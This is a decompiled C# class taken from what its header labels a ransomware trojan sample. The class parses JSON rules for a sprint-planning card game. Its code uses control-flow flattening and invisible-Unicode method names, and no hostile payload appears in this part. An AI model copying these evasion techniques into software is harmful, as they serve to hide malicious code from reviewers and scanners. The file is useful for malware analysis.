// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: EncoderExceptionFallbackBuff, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A176EC6-F8F7-4000-B7C0-CE79157CC27B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-64a92f765017361d260169feccd6dd444e4a20dfceb3dcad952d976477406e1c.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -2010206696;
      int asInt;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1187935111)) % 5U)
        {
          case 1:
            asInt = json["max-impact"].AsInt;
            num1 = (int) num2 * 506284310 ^ 553893830;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1406391622 ^ -1841746388;
            continue;
          case 4:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * -1989467658 ^ 1362161998;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = 1315936192;
      int aIndex;
      bool flag;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 780921485)) % 9U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = 1770659131;
            continue;
          case 1:
            aIndex = 0;
            num1 = (int) num2 * -868942938 ^ -369373761;
            continue;
          case 2:
            riskChances = numArray;
            num1 = (int) num2 * -573810624 ^ 1157303996;
            continue;
          case 3:
            num1 = (int) num2 * -2037445854 ^ -1455312404;
            continue;
          case 5:
            int num3 = !flag ? -394822720 : (num3 = -2085974602);
            num1 = num3 ^ (int) num2 * 1692853704;
            continue;
          case 6:
            flag = aIndex < numArray.Length;
            num1 = 1177178067;
            continue;
          case 7:
            num1 = (int) num2 * -515243332 ^ 1185589419;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_10:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
      List<Card> cardList = new List<Card>();
      int aIndex1 = 0;
label_14:
      bool flag1 = aIndex1 < count;
      int num1 = 1593805090;
      int num2;
      int aIndex2;
      bool flag2;
      JSONNode jsonNode;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1074227233)) % 20U)
        {
          case 0:
            int num4;
            num1 = num4 = num2 < jsonNode[aIndex2].AsInt ? 969984800 : (num4 = 1437529896);
            continue;
          case 1:
            array = cardList.ToArray();
            num1 = (int) num3 * 1243030876 ^ -1500042295;
            continue;
          case 2:
            flag2 = aIndex2 < maxImpact * 2;
            num1 = 693523569;
            continue;
          case 3:
            jsonNode = json[aIndex1];
            aIndex2 = 0;
            num1 = 746794439;
            continue;
          case 4:
            bool flag3 = aIndex2 < maxImpact;
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex2) : maxImpact * 2 - aIndex2,
              Type = aIndex1
            });
            num1 = 743374943;
            continue;
          case 5:
            num1 = 287638897;
            continue;
          case 7:
            num1 = 2125410424;
            continue;
          case 8:
            num1 = 440679058;
            continue;
          case 9:
            num1 = (int) num3 * -1502598295 ^ 1391628682;
            continue;
          case 10:
            ++num2;
            num1 = (int) num3 * 807766491 ^ 731590203;
            continue;
          case 11:
            int num5 = !flag1 ? -1187434499 : (num5 = -2102036889);
            num1 = num5 ^ (int) num3 * 89009319;
            continue;
          case 12:
            num1 = (int) num3 * 142873078 ^ -1621459021;
            continue;
          case 13:
            num1 = (int) num3 * -6323109 ^ -426377051;
            continue;
          case 14:
            num1 = (int) num3 * 1200073993 ^ -1089877291;
            continue;
          case 15:
            goto label_14;
          case 16:
            int num6 = flag2 ? 644310670 : (num6 = 1447138376);
            num1 = num6 ^ (int) num3 * 1242414958;
            continue;
          case 17:
            num2 = 0;
            num1 = (int) num3 * 1429127045 ^ -1546145076;
            continue;
          case 18:
            ++aIndex1;
            num1 = (int) num3 * 1341271882 ^ -1669967182;
            continue;
          case 19:
            ++aIndex2;
            num1 = (int) num3 * 1422326298 ^ 823826773;
            continue;
          default:
            goto label_21;
        }
      }
label_21:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1352928427;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -741361254)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -262211949 ^ -157683965;
            continue;
          case 2:
            goto label_1;
          case 3:
            str = Rules.\u200D⁯‎⁫‎‍⁯‫‮​‬⁯‍‌‌‮‪‍‎⁮⁪‬⁬‏‭‬⁪‎‌⁯⁬‪​​‪⁪‎​‭⁭‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * -577871462 ^ -217012056;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = 1977638221;
      string str1;
      Card card1;
      int num2;
      int index;
      string str2;
      Card[] cards;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 520288504)) % 13U)
        {
          case 0:
            num1 = (int) num3 * -1603478456 ^ 449068076;
            continue;
          case 1:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u206C‎‌⁬​‭‭‌‬‏‮‬‌‫‬⁭‏⁯‮‬⁫​‭⁮⁪​‪⁭‎‪‫‮⁬​‭‪‫‭‏‌‮((object) card2) : (string) null;
            str1 = Rules.\u200C‫‎⁮‏‫‫‪‮⁮‭‎‍​‪‌‫‭⁭‬⁭‌⁪​⁬‍‎‫‫⁬‭⁯‎⁮⁭⁭‬‮‭‫‮(str3, str4, " ");
            num1 = 1903822862;
            continue;
          case 2:
            str1 = Rules.\u202A‪⁫⁯‭‫​⁯‪‪⁮⁪‮⁯⁮‍‏‭‏‍‬‍‍‪⁭‭‪‪‏⁫‎⁮‮⁯⁫‫⁭‌⁫‎‮(str1, "\n\t");
            num2 = card1.Type;
            num1 = (int) num3 * -1598214184 ^ 1096002265;
            continue;
          case 3:
            ++index;
            num1 = (int) num3 * -2116495647 ^ 1390746988;
            continue;
          case 4:
            goto label_1;
          case 5:
            str2 = Rules.\u202A‪⁫⁯‭‫​⁯‪‪⁮⁪‮⁯⁮‍‏‭‏‍‬‍‍‪⁭‭‪‪‏⁫‎⁮‮⁯⁫‫⁭‌⁫‎‮(str1, "\n]");
            num1 = (int) num3 * 633172442 ^ 2047997889;
            continue;
          case 6:
            str1 = "[\n\t";
            num1 = (int) num3 * 1114947203 ^ -174666288;
            continue;
          case 7:
            num1 = (int) num3 * 14323230 ^ 1391071955;
            continue;
          case 8:
            num2 = 0;
            num1 = (int) num3 * 886938569 ^ 25308487;
            continue;
          case 9:
            card1 = cards[index];
            int num4;
            num1 = num4 = num2 == card1.Type ? 750861465 : (num4 = 1920064800);
            continue;
          case 11:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * 40222800 ^ -3867094;
            continue;
          case 12:
            int num5;
            num1 = num5 = index >= cards.Length ? 1552404377 : (num5 = 1328440450);
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = -24734390;
      int index;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1185348729)) % 9U)
        {
          case 0:
            index = 1;
            num1 = (int) num2 * 220932211 ^ -1981677647;
            continue;
          case 1:
            num1 = (int) num2 * 470606527 ^ -976703150;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -1994693270 ^ 595782351;
            continue;
          case 4:
            int num3;
            num1 = num3 = index >= this.RiskChances.Length ? -838362032 : (num3 = -1365199421);
            continue;
          case 6:
            str1 = Rules.\u200C‫‎⁮‏‫‫‪‮⁮‭‎‍​‪‌‫‭⁭‬⁭‌⁪​⁬‍‎‫‫⁬‭⁯‎⁮⁭⁭‬‮‭‫‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206D⁭⁪⁮​‮‪‬‎‬⁯​⁭⁭‏‪⁬‍‌​⁫‭‪⁮​‪‌‌⁬⁬⁯‫‎‏⁬‫⁫⁮‮()));
            ++index;
            num1 = -951187897;
            continue;
          case 7:
            str1 = Rules.\u202A‪⁫⁯‭‫​⁯‪‪⁮⁪‮⁯⁮‍‏‭‏‍‬‍‍‪⁭‭‪‪‏⁫‎⁮‮⁯⁫‫⁭‌⁫‎‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206D⁭⁪⁮​‮‪‬‎‬⁯​⁭⁭‏‪⁬‍‌​⁫‭‪⁮​‪‌‌⁬⁬⁯‫‎‏⁬‫⁫⁮‮()));
            num1 = (int) num2 * -1521972736 ^ -530953615;
            continue;
          case 8:
            str2 = Rules.\u202A‪⁫⁯‭‫​⁯‪‪⁮⁪‮⁯⁮‍‏‭‏‍‬‍‍‪⁭‭‪‪‏⁫‎⁮‮⁯⁫‫⁭‌⁫‎‮(str1, " ]");
            num1 = (int) num2 * 1551332587 ^ -439273443;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    static string \u200D⁯‎⁫‎‍⁯‫‮​‬⁯‍‌‌‮‪‍‎⁮⁪‬⁬‏‭‬⁪‎‌⁯⁬‪​​‪⁪‎​‭⁭‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u202A‪⁫⁯‭‫​⁯‪‪⁮⁪‮⁯⁮‍‏‭‏‍‬‍‍‪⁭‭‪‪‏⁫‎⁮‮⁯⁫‫⁭‌⁫‎‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u206C‎‌⁬​‭‭‌‬‏‮‬‌‫‬⁭‏⁯‮‬⁫​‭⁮⁪​‪⁭‎‪‫‮⁬​‭‪‫‭‏‌‮([In] object obj0) => obj0.ToString();

    static string \u200C‫‎⁮‏‫‫‪‮⁮‭‎‍​‪‌‫‭⁭‬⁭‌⁪​⁬‍‎‫‫⁬‭⁯‎⁮⁭⁭‬‮‭‫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206D⁭⁪⁮​‮‪‬‎‬⁯​⁭⁭‏‪⁬‍‌​⁫‭‪⁮​‪‌‌⁬⁬⁯‫‎‏⁬‫⁫⁮‮() => CultureInfo.InvariantCulture;
  }
}
